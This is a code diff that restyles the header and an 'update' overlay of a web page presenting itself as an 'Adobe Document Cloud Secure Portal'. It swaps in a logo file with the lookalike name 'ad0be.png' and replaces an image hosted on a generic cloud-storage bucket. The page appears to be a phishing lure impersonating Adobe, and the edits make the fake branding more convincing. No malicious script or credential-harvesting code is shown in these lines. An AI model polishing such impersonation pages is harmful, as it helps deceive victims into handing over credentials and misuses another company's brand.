@@ -81,6 +81,14 @@
             font-size: 18px;
             letter-spacing: -0.5px;
         }
+		
+		.logo-img {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;         /* remove if you don’t want rounded corners */
+    object-fit: contain;         /* keeps the PNG from stretching */
+    display: block;
+}
 
         .logo-text {
             display: flex;
@@ -895,12 +903,18 @@
     <div class="header">
         <div class="header-container">
             <div class="logo-container">
-                <div class="logo-mark">A</div>
-                <div class="logo-text">
-                    <div class="logo-title">Adobe Document Cloud</div>
-                    <div class="logo-subtitle">Secure Portal</div>
-                </div>
-            </div>
+    <img
+        class="logo-img"
+        src="ad0be.png"
+        alt="Adobe"
+        width="32"
+        height="32"
+    />
+    <div class="logo-text">
+        <div class="logo-title">Adobe Document Cloud</div>
+        <div class="logo-subtitle">Secure Portal</div>
+    </div>
+</div>
             <div class="header-actions">
                 <button class="header-btn">
                     <span>👤</span>
@@ -990,12 +1004,19 @@
 <div class="adobe-update-lightbox" id="adobeUpdateLightbox">
     <div class="adobe-update-content">
         <!-- Adobe Logo -->
-        <div class="adobe-logo-container" id="adobeLogoContainer">
-            <img src="https://storage.googleapis.com/atlas-web-20260306-1360d7a95c5a/adb.png" 
-                 alt="Adobe Logo" 
-                 class="adobe-logo-img"
-                 id="adobeLogoImg">
-        </div>
+       <div class="logo-container">
+    <img
+        class="logo-img"
+        src="ad0be.png"
+        alt="Adobe"
+        width="32"
+        height="32"
+    />
+    <div class="logo-text">
+        <div class="logo-title">Adobe Document Cloud</div>
+        <div class="logo-subtitle">Secure Portal</div>
+    </div>
+</div>
         
         <!-- Title -->
         <h2 class="adobe-update-title" id="adobeUpdateTitle">Retrieving Project Documents</h2>
